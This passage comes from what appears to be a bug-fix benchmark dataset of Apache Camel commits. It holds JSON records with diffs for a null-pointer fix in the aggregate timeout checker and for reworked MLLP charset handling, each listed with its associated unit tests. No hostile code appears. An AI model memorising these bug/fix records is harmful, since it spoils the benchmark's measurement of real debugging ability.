                "contents_url": "https://api.github.com/repos/apache/camel/contents/core/camel-core/src/main/java/org/apache/camel/processor/aggregate/AggregateProcessor.java?ref=0a678d8920049acc85831f218e478d000125ed15",
                "deletions": 9,
                "filename": "core/camel-core/src/main/java/org/apache/camel/processor/aggregate/AggregateProcessor.java",
                "patch": "@@ -98,7 +98,7 @@\n     public static final String COMPLETED_BY_TIMEOUT = \"timeout\";\n     public static final String COMPLETED_BY_FORCE = \"force\";\n \n-    private Lock lock;\n+    private volatile Lock lock;\n     private final AtomicBoolean aggregateRepositoryWarned = new AtomicBoolean();\n     private final CamelContext camelContext;\n     private final AsyncProcessor processor;\n@@ -1116,12 +1116,15 @@ private AggregationTimeoutMap(ScheduledExecutorService executor, long requestMap\n \n         @Override\n         public void purge() {\n-            // must acquire the shared aggregation lock to be able to purge\n-            lock.lock();\n-            try {\n-                super.purge();\n-            } finally {\n-                lock.unlock();\n+            // wait for lock to be created\n+            if (lock != null) {\n+                // must acquire the shared aggregation lock to be able to purge\n+                lock.lock();\n+                try {\n+                    super.purge();\n+                } finally {\n+                    lock.unlock();\n+                }\n             }\n         }\n \n@@ -1399,7 +1402,7 @@ protected void doStart() throws Exception {\n         if (getCompletionInterval() > 0) {\n             log.info(\"Using CompletionInterval to run every {} millis.\", getCompletionInterval());\n             if (getTimeoutCheckerExecutorService() == null) {\n-                setTimeoutCheckerExecutorService(camelContext.getExecutorServiceManager().newScheduledThreadPool(this, AGGREGATE_TIMEOUT_CHECKER, 1));\n+                setTimeoutCheckerExecutorService(camelContext.getExecutorServiceManager().newSingleThreadScheduledExecutor(this, AGGREGATE_TIMEOUT_CHECKER));\n                 shutdownTimeoutCheckerExecutorService = true;\n             }\n             // trigger completion based on interval\n@@ -1410,7 +1413,7 @@ protected void doStart() throws Exception {\n         if (getCompletionTimeout() > 0 || getCompletionTimeoutExpression() != null) {\n             log.info(\"Using CompletionTimeout to trigger after {} millis of inactivity.\", getCompletionTimeout());\n             if (getTimeoutCheckerExecutorService() == null) {\n-                setTimeoutCheckerExecutorService(camelContext.getExecutorServiceManager().newScheduledThreadPool(this, AGGREGATE_TIMEOUT_CHECKER, 1));\n+                setTimeoutCheckerExecutorService(camelContext.getExecutorServiceManager().newSingleThreadScheduledExecutor(this, AGGREGATE_TIMEOUT_CHECKER));\n                 shutdownTimeoutCheckerExecutorService = true;\n             }\n             // check for timed out aggregated messages once every second",
                "raw_url": "https://github.com/apache/camel/raw/0a678d8920049acc85831f218e478d000125ed15/core/camel-core/src/main/java/org/apache/camel/processor/aggregate/AggregateProcessor.java",
                "sha": "1db5025ea353f395900aff50e31c6c814c4a05bd",
                "status": "modified"
            }
        ],
        "message": "Fixed potential NPE in aggregate EIP timeout checker",
        "parent": "https://github.com/apache/camel/commit/ea81349dbd71041395bcc8ac55850700f5b43919",
        "patched_files": [
            "AggregateProcessor.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "AggregateProcessorTest.java"
        ]
    },
    "camel_0b7fb51": {
        "bug_id": "camel_0b7fb51",
        "commit": "https://github.com/apache/camel/commit/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a",
        "file": [
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/components/camel-mllp/src/main/docs/mllp-component.adoc",
                "changes": 7,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mllp/src/main/docs/mllp-component.adoc?ref=0b7fb515b5f09ab5ce5f5fa269474415070c2f6a",
                "deletions": 3,
                "filename": "components/camel-mllp/src/main/docs/mllp-component.adoc",
                "patch": "@@ -1,7 +1,7 @@\n [[mllp-component]]\n == MLLP Component\n \n-*Available as of Camel version 2.17*\n+*Available as of Camel version *\n \n The MLLP component is specifically designed to handle the nuances of the\n MLLP protocol and provide\u00a0the functionality required by Healthcare\n@@ -41,7 +41,7 @@ for this component:\n \n \n // component options: START\n-The MLLP component supports 4 options which are listed below.\n+The MLLP component supports 5 options which are listed below.\n \n \n \n@@ -50,6 +50,7 @@ The MLLP component supports 4 options which are listed below.\n | Name | Description | Default | Type\n | *logPhi* (advanced) | Set the component to log PHI data. | true | Boolean\n | *logPhiMaxBytes* (advanced) | Set the maximum number of bytes of PHI that will be logged in a log entry. | 5120 | Integer\n+| *defaultCharset* (advanced) | Set the default character set to use for byte to/from String conversions. | ISO-8859-1 | String\n | *configuration* (common) | Sets the default configuration to use when creating MLLP endpoints. |  | MllpConfiguration\n | *resolveProperty Placeholders* (advanced) | Whether the component should resolve property placeholders on itself when starting. Only properties which are of String type can use property placeholders. | true | boolean\n |===\n@@ -89,7 +90,7 @@ with the following path and query parameters:\n | *bufferWrites* (common) | *Deprecated* Enable/Disable the buffering of HL7 payloads before writing to the socket. | false | boolean\n | *hl7Headers* (common) | Enable/Disable the automatic generation of message headers from the HL7 Message MLLP Consumers only | true | boolean\n | *requireEndOfData* (common) | Enable/Disable strict compliance to the MLLP standard. The MLLP standard specifies START_OF_BLOCKhl7 payloadEND_OF_BLOCKEND_OF_DATA however some systems do not send the final END_OF_DATA byte. This setting controls whether or not the final END_OF_DATA byte is required or optional. | true | boolean\n-| *stringPayload* (common) | Enable/Disable converting the payload to a String. If enabled HL7 Payloads received from external systems will be validated converted to a String. If the charsetName property is set that character set will be used for the conversion. If the charsetName property is not set the value of MSH-18 will be used to determine th appropriate character set. If MSH-18 is not set then the default ASCII character set will be use. | true | boolean\n+| *stringPayload* (common) | Enable/Disable converting the payload to a String. If enabled HL7 Payloads received from external systems will be validated converted to a String. If the charsetName property is set that character set will be used for the conversion. If the charsetName property is not set the value of MSH-18 will be used to determine th appropriate character set. If MSH-18 is not set then the default ISO-8859-1 character set will be use. | true | boolean\n | *validatePayload* (common) | Enable/Disable the validation of HL7 Payloads If enabled HL7 Payloads received from external systems will be validated (see Hl7Util.generateInvalidPayloadExceptionMessage for details on the validation). If and invalid payload is detected a MllpInvalidMessageException (for consumers) or a MllpInvalidAcknowledgementException will be thrown. | false | boolean\n | *bridgeErrorHandler* (consumer) | Allows for bridging the consumer to the Camel routing Error Handler which mean any exceptions occurred while the consumer is trying to receive incoming messages or the likes will now be processed as a message and handled by the routing Error Handler. If disabled the consumer will use the org.apache.camel.spi.ExceptionHandler to deal with exceptions by logging them at WARN or ERROR level and ignored. | true | boolean\n | *exceptionHandler* (consumer) | To let the consumer use a custom ExceptionHandler. Notice if the option bridgeErrorHandler is enabled then this options is not in use. By default the consumer will deal with exceptions that will be logged at WARN or ERROR level and ignored. |  | ExceptionHandler",
                "raw_url": "https://github.com/apache/camel/raw/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/components/camel-mllp/src/main/docs/mllp-component.adoc",
                "sha": "75f52cb9a031158097ec3f8e766860d6b271177a",
                "status": "modified"
            },
            {
                "additions": 64,
                "blob_url": "https://github.com/apache/camel/blob/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/components/camel-mllp/src/main/java/org/apache/camel/component/mllp/MllpComponent.java",
                "changes": 65,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mllp/src/main/java/org/apache/camel/component/mllp/MllpComponent.java?ref=0b7fb515b5f09ab5ce5f5fa269474415070c2f6a",
                "deletions": 1,
                "filename": "components/camel-mllp/src/main/java/org/apache/camel/component/mllp/MllpComponent.java",
                "patch": "@@ -17,12 +17,13 @@\n \n package org.apache.camel.component.mllp;\n \n+import java.nio.charset.Charset;\n+import java.nio.charset.StandardCharsets;\n import java.util.Map;\n \n import org.apache.camel.CamelContext;\n import org.apache.camel.Endpoint;\n import org.apache.camel.impl.DefaultComponent;\n-import org.apache.camel.impl.UriEndpointComponent;\n import org.apache.camel.spi.Metadata;\n import org.slf4j.Logger;\n import org.slf4j.LoggerFactory;\n@@ -33,6 +34,7 @@\n public class MllpComponent extends DefaultComponent {\n     public static final String MLLP_LOG_PHI_PROPERTY = \"org.apache.camel.component.mllp.logPHI\";\n     public static final String MLLP_LOG_PHI_MAX_BYTES_PROPERTY = \"org.apache.camel.component.mllp.logPHI.maxBytes\";\n+    public static final String MLLP_DEFAULT_CHARSET_PROPERTY = \"org.apache.camel.component.mllp.charset.default\";\n     public static final boolean DEFAULT_LOG_PHI = true;\n     public static final int DEFAULT_LOG_PHI_MAX_BYTES = 5120;\n \n@@ -42,6 +44,8 @@\n     static Boolean logPhi;\n     @Metadata(label = \"advanced\", defaultValue = \"5120\")\n     static Integer logPhiMaxBytes;\n+    @Metadata(label = \"advanced\", defaultValue = \"ISO-8859-1\")\n+    static Charset defaultCharset;\n \n     MllpConfiguration configuration;\n \n@@ -133,6 +137,65 @@ public static void setLogPhiMaxBytes(Integer logPhiMaxBytes) {\n     }\n \n \n+    public static boolean hasDefaultCharset() {\n+        return defaultCharset != null;\n+    }\n+\n+    public static Charset getDefaultCharset() {\n+        if (hasDefaultCharset()) {\n+            return defaultCharset;\n+        }\n+\n+        String defaultCharacterSetNamePropertyValue = System.getProperty(MllpComponent.MLLP_DEFAULT_CHARSET_PROPERTY);\n+\n+        if (defaultCharacterSetNamePropertyValue != null && !defaultCharacterSetNamePropertyValue.isEmpty()) {\n+            try {\n+                if (Charset.isSupported(defaultCharacterSetNamePropertyValue)) {\n+                    defaultCharset = Charset.forName(defaultCharacterSetNamePropertyValue);\n+                } else {\n+                    defaultCharset = StandardCharsets.ISO_8859_1;\n+                    log.warn(\"Unsupported character set name '{}' in system property {} - using character set {} as default\",\n+                        defaultCharacterSetNamePropertyValue, MllpComponent.MLLP_DEFAULT_CHARSET_PROPERTY, defaultCharset);\n+                }\n+            } catch (Exception charsetEx) {\n+                defaultCharset = StandardCharsets.ISO_8859_1;\n+                log.warn(\"Exception encountered determining character set for '{}' found in  system property {} - using default value of {}\",\n+                    defaultCharacterSetNamePropertyValue, MllpComponent.MLLP_DEFAULT_CHARSET_PROPERTY, defaultCharset);\n+            }\n+        } else {\n+            defaultCharset = StandardCharsets.ISO_8859_1;\n+        }\n+\n+        return defaultCharset;\n+    }\n+\n+    /**\n+     * Set the default character set to use for byte[] to/from String conversions.\n+     *\n+     * @param defaultCharacterSetName the name of the Java Charset.\n+     */\n+    public static void setDefaultCharset(String defaultCharacterSetName) {\n+        if (defaultCharacterSetName != null && !defaultCharacterSetName.isEmpty()) {\n+            try {\n+                if (Charset.isSupported(defaultCharacterSetName)) {\n+                    MllpComponent.defaultCharset = Charset.forName(defaultCharacterSetName);\n+                } else {\n+                    log.warn(\"Unsupported character set name '{}' in system property {} - continuing to use character set {} as default\",\n+                        defaultCharacterSetName, defaultCharset);\n+                }\n+            } catch (Exception charsetEx) {\n+                MllpComponent.defaultCharset = StandardCharsets.ISO_8859_1;\n+                log.warn(\"Exception encountered determining character set for '{}' - continuing to use character set {} as default\",\n+                    defaultCharacterSetName, defaultCharset);\n+            }\n+        }\n+    }\n+\n+    public static void setDefaultCharset(Charset defaultCharset) {\n+        if (defaultCharset != null) {\n+            MllpComponent.defaultCharset = defaultCharset;\n+        }\n+    }\n \n     public boolean hasConfiguration() {\n         return configuration != null;",
                "raw_url": "https://github.com/apache/camel/raw/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/components/camel-mllp/src/main/java/org/apache/camel/component/mllp/MllpComponent.java",
                "sha": "0eebadaa90d77bcac9a99558c67b85389dabfd00",
                "status": "modified"
            },
            {
                "additions": 95,
                "blob_url": "https://github.com/apache/camel/blob/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/components/camel-mllp/src/main/java/org/apache/camel/component/mllp/MllpConfiguration.java",
                "changes": 97,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mllp/src/main/java/org/apache/camel/component/mllp/MllpConfiguration.java?ref=0b7fb515b5f09ab5ce5f5fa269474415070c2f6a",
                "deletions": 2,
                "filename": "components/camel-mllp/src/main/java/org/apache/camel/component/mllp/MllpConfiguration.java",
                "patch": "@@ -17,12 +17,16 @@\n \n package org.apache.camel.component.mllp;\n \n+import java.nio.charset.Charset;\n import java.util.Objects;\n \n+import org.apache.camel.Exchange;\n import org.apache.camel.ExchangePattern;\n+import org.apache.camel.component.mllp.internal.Hl7Util;\n import org.apache.camel.spi.ExceptionHandler;\n import org.apache.camel.spi.UriParam;\n import org.apache.camel.spi.UriParams;\n+import org.apache.camel.util.IOHelper;\n import org.slf4j.Logger;\n import org.slf4j.LoggerFactory;\n \n@@ -213,7 +217,96 @@ public boolean hasCharsetName() {\n     }\n \n     public String getCharsetName() {\n-        return charsetName;\n+        if (hasCharsetName()) {\n+            try {\n+                if (Charset.isSupported(charsetName)) {\n+                    return charsetName;\n+                }\n+                LOG.warn(\"Unsupported character set name '{}' configured for the MLLP Endpoint  - returning default charset name {}\",\n+                    charsetName, MllpComponent.getDefaultCharset());\n+            } catch (Exception charsetEx) {\n+                LOG.warn(\"Ignoring exception determining character set for name '{}' configured for the MLLP Endpoint - returning default charset name {}\",\n+                    charsetName, MllpComponent.getDefaultCharset(), charsetEx);\n+            }\n+        }\n+\n+        return MllpComponent.getDefaultCharset().name();\n+    }\n+\n+    public Charset getCharset() {\n+        if (hasCharsetName()) {\n+            try {\n+                if (Charset.isSupported(charsetName)) {\n+                    return Charset.forName(charsetName);\n+                }\n+                LOG.warn(\"Unsupported character set name '{}' configured for the MLLP Endpoint - returning default charset {}\", charsetName, MllpComponent.getDefaultCharset());\n+            } catch (Exception charsetEx) {\n+                LOG.warn(\"Ignoring exception determining character set for name '{}' configured for the MLLP Endpoint - returning default charset {}\",\n+                    charsetName, MllpComponent.getDefaultCharset(), charsetEx);\n+            }\n+        }\n+\n+        return MllpComponent.getDefaultCharset();\n+    }\n+\n+    public Charset getCharset(Exchange exchange) {\n+        String exchangeCharsetName = IOHelper.getCharsetName(exchange, false);\n+        if (exchangeCharsetName != null && !exchangeCharsetName.isEmpty()) {\n+            try {\n+                if (Charset.isSupported(exchangeCharsetName)) {\n+                    return Charset.forName(exchangeCharsetName);\n+                }\n+                LOG.warn(\"Unsupported character set name '{}' specified in the Exchange - checking for configured character set\", exchangeCharsetName);\n+            } catch (Exception charsetEx) {\n+                LOG.warn(\"Ignoring exception determining character set for name '{}' specified in the Exchange - checking for configured character set\", exchangeCharsetName, charsetEx);\n+            }\n+        }\n+\n+        return getCharset();\n+    }\n+\n+    public Charset getCharset(Exchange exchange, byte[] hl7Bytes) {\n+        String exchangeCharsetName = IOHelper.getCharsetName(exchange, false);\n+        if (exchangeCharsetName != null && !exchangeCharsetName.isEmpty()) {\n+            try {\n+                if (Charset.isSupported(exchangeCharsetName)) {\n+                    return Charset.forName(exchangeCharsetName);\n+                }\n+                LOG.warn(\"Unsupported character set name '{}' specified in the Exchange - checking for configured character set\", exchangeCharsetName);\n+            } catch (Exception charsetEx) {\n+                LOG.warn(\"Ignoring exception determining character set for name '{}' specified in the Exchange - checking for configured character set\", exchangeCharsetName, charsetEx);\n+            }\n+        }\n+\n+        if (hasCharsetName()) {\n+            try {\n+                if (Charset.isSupported(charsetName)) {\n+                    return Charset.forName(charsetName);\n+                }\n+                LOG.warn(\"Unsupported character set name '{}' configured for the MLLP Endpoint - checking for character set in payload\", charsetName);\n+            } catch (Exception charsetEx) {\n+                LOG.warn(\"Ignoring exception determining character set for name '{}' configured for the MLLP Endpoint - checking for character set in payload\", charsetName, charsetEx);\n+            }\n+        }\n+\n+        String msh18 = Hl7Util.findMsh18(hl7Bytes);\n+        if (msh18 != null  && !msh18.isEmpty()) {\n+            if (MllpProtocolConstants.MSH18_VALUES.containsKey(msh18)) {\n+                return MllpProtocolConstants.MSH18_VALUES.get(msh18);\n+            }\n+            try {\n+                if (Charset.isSupported(msh18)) {\n+                    return Charset.forName(msh18);\n+                }\n+                LOG.info(\"Unsupported character set name '{}' found in MSH-18 - using default character set {}\",\n+                    msh18, MllpComponent.getDefaultCharset());\n+            } catch (Exception charsetEx) {\n+                LOG.info(\"Ignoring exception encountered determining character set for for name '{}' found in MSH-18 - using default character set {}\",\n+                    msh18, MllpComponent.getDefaultCharset(), charsetEx);\n+            }\n+        }\n+\n+        return MllpComponent.getDefaultCharset();\n     }\n \n     /**\n@@ -548,7 +641,7 @@ public boolean isStringPayload() {\n      *\n      * If the charsetName property is set, that character set will be used for the conversion.  If the charsetName property is\n      * not set, the value of MSH-18 will be used to determine th appropriate character set.  If MSH-18 is not set, then\n-     * the default ASCII character set will be use.\n+     * the default ISO-8859-1 character set will be use.\n      *\n      * @param stringPayload enabled if true, otherwise disabled\n      */",
                "raw_url": "https://github.com/apache/camel/raw/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/components/camel-mllp/src/main/java/org/apache/camel/component/mllp/MllpConfiguration.java",
                "sha": "3bce5be15c118564ca533c34553e4fde33f5adf9",
                "status": "modified"
            },
            {
                "additions": 14,
                "blob_url": "https://github.com/apache/camel/blob/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/components/camel-mllp/src/main/java/org/apache/camel/component/mllp/MllpEndpoint.java",
                "changes": 75,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mllp/src/main/java/org/apache/camel/component/mllp/MllpEndpoint.java?ref=0b7fb515b5f09ab5ce5f5fa269474415070c2f6a",
                "deletions": 61,
                "filename": "components/camel-mllp/src/main/java/org/apache/camel/component/mllp/MllpEndpoint.java",
                "patch": "@@ -34,11 +34,13 @@\n import org.apache.camel.api.management.ManagedAttribute;\n import org.apache.camel.api.management.ManagedResource;\n import org.apache.camel.component.mllp.internal.Hl7Util;\n+import org.apache.camel.component.mllp.internal.MllpSocketBuffer;\n import org.apache.camel.impl.DefaultEndpoint;\n import org.apache.camel.spi.Metadata;\n import org.apache.camel.spi.UriEndpoint;\n import org.apache.camel.spi.UriParam;\n import org.apache.camel.spi.UriPath;\n+import org.apache.camel.util.IOHelper;\n import org.slf4j.Logger;\n import org.slf4j.LoggerFactory;\n \n@@ -51,7 +53,7 @@\n  * <p/>\n  */\n @ManagedResource(description = \"MLLP Endpoint\")\n-@UriEndpoint(scheme = \"mllp\", firstVersion = \"2.17.0\", title = \"MLLP\", syntax = \"mllp:hostname:port\", consumerClass = MllpTcpServerConsumer.class, label = \"mllp\")\n+@UriEndpoint(scheme = \"mllp\", title = \"MLLP\", syntax = \"mllp:hostname:port\", consumerClass = MllpTcpServerConsumer.class, label = \"mllp\")\n public class MllpEndpoint extends DefaultEndpoint {\n     // Use constants from MllpProtocolConstants\n     @Deprecated()\n@@ -67,8 +69,8 @@\n     @Deprecated()\n     public static final char MESSAGE_TERMINATOR = MllpProtocolConstants.MESSAGE_TERMINATOR;\n \n-    @Deprecated // Use constants from MllpProtocolConstants\n-    public static final Charset DEFAULT_CHARSET = MllpProtocolConstants.DEFAULT_CHARSET;\n+    @Deprecated // Use MllpComponent.getDefaultCharset()\n+    public static final Charset DEFAULT_CHARSET = MllpComponent.getDefaultCharset();\n \n     private static final Logger LOG = LoggerFactory.getLogger(MllpEndpoint.class);\n \n@@ -229,54 +231,6 @@ public void setConfiguration(MllpConfiguration configuration) {\n         }\n     }\n \n-    public Charset determineCharset(byte[] hl7Bytes, String msh18) {\n-        Charset answer = MllpProtocolConstants.DEFAULT_CHARSET;\n-\n-        if (configuration.hasCharsetName()) {\n-            String charsetName = configuration.getCharsetName();\n-            if (Charset.isSupported(charsetName)) {\n-                answer = Charset.forName(charsetName);\n-            } else {\n-                LOG.warn(\"Unsupported Character Set {} configured for component - using default character set {}\", charsetName, MllpProtocolConstants.DEFAULT_CHARSET);\n-            }\n-        } else if (msh18 != null && !msh18.isEmpty()) {\n-            if (MllpProtocolConstants.MSH18_VALUES.containsKey(msh18)) {\n-                answer = MllpProtocolConstants.MSH18_VALUES.get(msh18);\n-            } else {\n-                LOG.warn(\"Unsupported Character Set {} specified for MSH-18 - using default character set {}\", msh18, MllpProtocolConstants.DEFAULT_CHARSET);\n-            }\n-        } else {\n-            String foundMsh18 = Hl7Util.findMsh18(hl7Bytes);\n-            if (foundMsh18 != null && !foundMsh18.isEmpty()) {\n-                if (MllpProtocolConstants.MSH18_VALUES.containsKey(foundMsh18)) {\n-                    answer = MllpProtocolConstants.MSH18_VALUES.get(foundMsh18);\n-                } else {\n-                    LOG.warn(\"Unsupported Character Set {} found in MSH-18 - using default character set {}\", foundMsh18, MllpProtocolConstants.DEFAULT_CHARSET);\n-                }\n-            } else {\n-                LOG.debug(\"Character Set not specified and no Character Set found in MSH-18 - using default character set {}\", MllpProtocolConstants.DEFAULT_CHARSET);\n-            }\n-        }\n-\n-        return answer;\n-    }\n-\n-    public String createNewString(byte[] hl7Bytes, String msh18) {\n-        if (hl7Bytes == null) {\n-            return null;\n-        } else if (hl7Bytes.length == 0) {\n-            return \"\";\n-        }\n-\n-        Charset charset = determineCharset(hl7Bytes, msh18);\n-\n-        LOG.debug(\"Creating new String using Charset {}\", charset);\n-\n-        return new String(hl7Bytes, charset);\n-    }\n-\n-\n-\n     // Pass-through configuration methods\n     public void setBacklog(Integer backlog) {\n         configuration.setBacklog(backlog);\n@@ -370,34 +324,32 @@ public void setCharsetName(String charsetName) {\n     // Utility methods for producers and consumers\n \n     public boolean checkBeforeSendProperties(Exchange exchange, Socket socket, Logger log) {\n+        final String logMessageFormat = \"Exchange property {} = {} - {} connection\";\n         boolean answer = true;\n \n         if (exchange.getProperty(MllpConstants.MLLP_RESET_CONNECTION_BEFORE_SEND, boolean.class)) {\n-            log.warn(\"Exchange property \" + MllpConstants.MLLP_RESET_CONNECTION_BEFORE_SEND + \" = \"\n-                + exchange.getProperty(MllpConstants.MLLP_RESET_CONNECTION_BEFORE_SEND) + \" - resetting connection\");\n-            doConnectionClose(socket, true, log);\n+            log.warn(logMessageFormat, MllpConstants.MLLP_RESET_CONNECTION_BEFORE_SEND, exchange.getProperty(MllpConstants.MLLP_RESET_CONNECTION_BEFORE_SEND), \"resetting\");\n+            doConnectionClose(socket, true, null);\n             answer = false;\n         } else if (exchange.getProperty(MllpConstants.MLLP_CLOSE_CONNECTION_BEFORE_SEND, boolean.class)) {\n-            log.warn(\"Exchange property \" + MllpConstants.MLLP_CLOSE_CONNECTION_BEFORE_SEND + \" = \"\n-                + exchange.getProperty(MllpConstants.MLLP_CLOSE_CONNECTION_BEFORE_SEND) + \" - closing connection\");\n-            doConnectionClose(socket, false, log);\n+            log.warn(logMessageFormat, MllpConstants.MLLP_CLOSE_CONNECTION_BEFORE_SEND, exchange.getProperty(MllpConstants.MLLP_CLOSE_CONNECTION_BEFORE_SEND), \"closing\");\n+            doConnectionClose(socket, false, null);\n             answer = false;\n         }\n \n         return answer;\n     }\n \n     public boolean checkAfterSendProperties(Exchange exchange, Socket socket, Logger log) {\n+        final String logMessageFormat = \"Exchange property {} = {} - {} connection\";\n         boolean answer = true;\n \n         if (exchange.getProperty(MllpConstants.MLLP_RESET_CONNECTION_AFTER_SEND, boolean.class)) {\n-            log.warn(\"Exchange property \" + MllpConstants.MLLP_RESET_CONNECTION_AFTER_SEND + \" = \"\n-                + exchange.getProperty(MllpConstants.MLLP_RESET_CONNECTION_AFTER_SEND) + \" - resetting connection\");\n+            log.warn(logMessageFormat, MllpConstants.MLLP_RESET_CONNECTION_AFTER_SEND, exchange.getProperty(MllpConstants.MLLP_RESET_CONNECTION_AFTER_SEND), \"resetting\");\n             doConnectionClose(socket, true, log);\n             answer = false;\n         } else if (exchange.getProperty(MllpConstants.MLLP_CLOSE_CONNECTION_AFTER_SEND, boolean.class)) {\n-            log.warn(\"Exchange property \" + MllpConstants.MLLP_CLOSE_CONNECTION_AFTER_SEND + \" = \"\n-                + exchange.getProperty(MllpConstants.MLLP_CLOSE_CONNECTION_AFTER_SEND) + \" - closing connection\");\n+            log.warn(logMessageFormat, MllpConstants.MLLP_CLOSE_CONNECTION_AFTER_SEND, exchange.getProperty(MllpConstants.MLLP_CLOSE_CONNECTION_AFTER_SEND), \"closing\");\n             doConnectionClose(socket, false, log);\n             answer = false;\n         }\n@@ -424,6 +376,7 @@ public void doConnectionClose(Socket socket, boolean reset, Logger log) {\n                     log.debug(ignoringCallLogFormat, reset ? \"Reset\" : \"Close\", \"Socket is already closed\", localSocketAddress, remoteSocketAddress);\n                 }\n             } else {\n+                this.updateLastConnectionTerminatedTicks();\n                 final String ignoringExceptionStringFormat = \"Ignoring %s encountered calling %s on Socket: localAddress=%s remoteAddress=%s\";\n                 if (!socket.isInputShutdown()) {\n                     if (log != null) {",
                "raw_url": "https://github.com/apache/camel/raw/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/components/camel-mllp/src/main/java/org/apache/camel/component/mllp/MllpEndpoint.java",
                "sha": "d91e456ce23b76488e2de7498a2981850f105c00",
                "status": "modified"
            },
            {
                "additions": 8,
                "blob_url": "https://github.com/apache/camel/blob/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/components/camel-mllp/src/main/java/org/apache/camel/component/mllp/MllpProtocolConstants.java",
                "changes": 17,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mllp/src/main/java/org/apache/camel/component/mllp/MllpProtocolConstants.java?ref=0b7fb515b5f09ab5ce5f5fa269474415070c2f6a",
                "deletions": 9,
                "filename": "components/camel-mllp/src/main/java/org/apache/camel/component/mllp/MllpProtocolConstants.java",
                "patch": "@@ -35,7 +35,6 @@\n \n     public static final byte[] PAYLOAD_TERMINATOR;\n \n-    public static final Charset DEFAULT_CHARSET = StandardCharsets.US_ASCII;\n     public static final Map<String, Charset> MSH18_VALUES;\n \n     static {\n@@ -56,15 +55,15 @@\n         MSH18_VALUES.put(\"8859/8\", Charset.forName(\"ISO-8859-8\"));\n         MSH18_VALUES.put(\"8859/9\", Charset.forName(\"ISO-8859-9\"));\n \n-    /*\n-      // These are defined in the HL7 Spec, but I don't know how to map them to Java charset names\n+        /*\n+          // These are defined in the HL7 Spec, but I don't know how to map them to Java charset names\n \n-      MSH18_VALUES.put(\"JAS2020\", \"????\");\n-      MSH18_VALUES.put(\"JIS X 0202\", \"????\");\n-      MSH18_VALUES.put(\"JIS X 0201-1976\", \"????\");\n-      MSH18_VALUES.put(\"JIS X 0208-1990\", \"????\");\n-      MSH18_VALUES.put(\"JIS X 0212-1990\", \"????\");\n-    */\n+          MSH18_VALUES.put(\"JAS2020\", \"????\");\n+          MSH18_VALUES.put(\"JIS X 0202\", \"????\");\n+          MSH18_VALUES.put(\"JIS X 0201-1976\", \"????\");\n+          MSH18_VALUES.put(\"JIS X 0208-1990\", \"????\");\n+          MSH18_VALUES.put(\"JIS X 0212-1990\", \"????\");\n+        */\n     }\n \n     private MllpProtocolConstants() {",
                "raw_url": "https://github.com/apache/camel/raw/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/components/camel-mllp/src/main/java/org/apache/camel/component/mllp/MllpProtocolConstants.java",
                "sha": "1d52b051317a3bf1cbd003981109f6ae514d533e",
                "status": "modified"
            },
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/components/camel-mllp/src/main/java/org/apache/camel/component/mllp/MllpTcpClientProducer.java",
                "changes": 17,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mllp/src/main/java/org/apache/camel/component/mllp/MllpTcpClientProducer.java?ref=0b7fb515b5f09ab5ce5f5fa269474415070c2f6a",
                "deletions": 12,
                "filename": "components/camel-mllp/src/main/java/org/apache/camel/component/mllp/MllpTcpClientProducer.java",
                "patch": "@@ -151,15 +151,9 @@ public synchronized void process(Exchange exchange) throws Exception {\n                 hl7MessageBytes = (byte[]) messageBody;\n             } else if (messageBody instanceof String) {\n                 String stringBody = (String) messageBody;\n-                byte[] tmpHl7MessageBytes = stringBody.getBytes(MllpProtocolConstants.DEFAULT_CHARSET);\n-                Charset tmpCharset = getEndpoint().determineCharset(tmpHl7MessageBytes, null);\n-                exchange.setProperty(Exchange.CHARSET_NAME, tmpCharset.name());\n-                if (tmpCharset != null && tmpCharset != MllpProtocolConstants.DEFAULT_CHARSET) {\n-                    hl7MessageBytes = stringBody.getBytes(tmpCharset);\n-                    exchange.setProperty(Exchange.CHARSET_NAME, tmpCharset.name());\n-                } else {\n-                    hl7MessageBytes = tmpHl7MessageBytes;\n-                    exchange.setProperty(Exchange.CHARSET_NAME, MllpProtocolConstants.DEFAULT_CHARSET.name());\n+                hl7MessageBytes = stringBody.getBytes(getConfiguration().getCharset(exchange));\n+                if (getConfiguration().hasCharsetName()) {\n+                    exchange.setProperty(Exchange.CHARSET_NAME, getConfiguration().getCharsetName());\n                 }\n             }\n \n@@ -247,8 +241,7 @@ public synchronized void process(Exchange exchange) throws Exception {\n                         log.debug(\"Populating message headers with the acknowledgement from the external system\");\n                         message.setHeader(MllpConstants.MLLP_ACKNOWLEDGEMENT, acknowledgementBytes);\n                         if (acknowledgementBytes != null && acknowledgementBytes.length > 0) {\n-                            message.setHeader(MllpConstants.MLLP_ACKNOWLEDGEMENT_STRING,\n-                                getEndpoint().createNewString(acknowledgementBytes, message.getHeader(MllpConstants.MLLP_CHARSET, String.class)));\n+                            message.setHeader(MllpConstants.MLLP_ACKNOWLEDGEMENT_STRING, new String(acknowledgementBytes, getConfiguration().getCharset(exchange, acknowledgementBytes)));\n                         } else {\n                             message.setHeader(MllpConstants.MLLP_ACKNOWLEDGEMENT_STRING, \"\");\n                         }\n@@ -272,7 +265,7 @@ public synchronized void process(Exchange exchange) throws Exception {\n                             getEndpoint().checkAfterSendProperties(exchange, socket, log);\n                         }\n                     } else {\n-                        exchange.setException(new MllpInvalidAcknowledgementException(\"Invalid acknowledgement received\", hl7MessageBytes, mllpBuffer.toByteArray()));\n+                        exchange.setException(new MllpInvalidAcknowledgementException(\"Invalid acknowledgement received\", hl7MessageBytes, 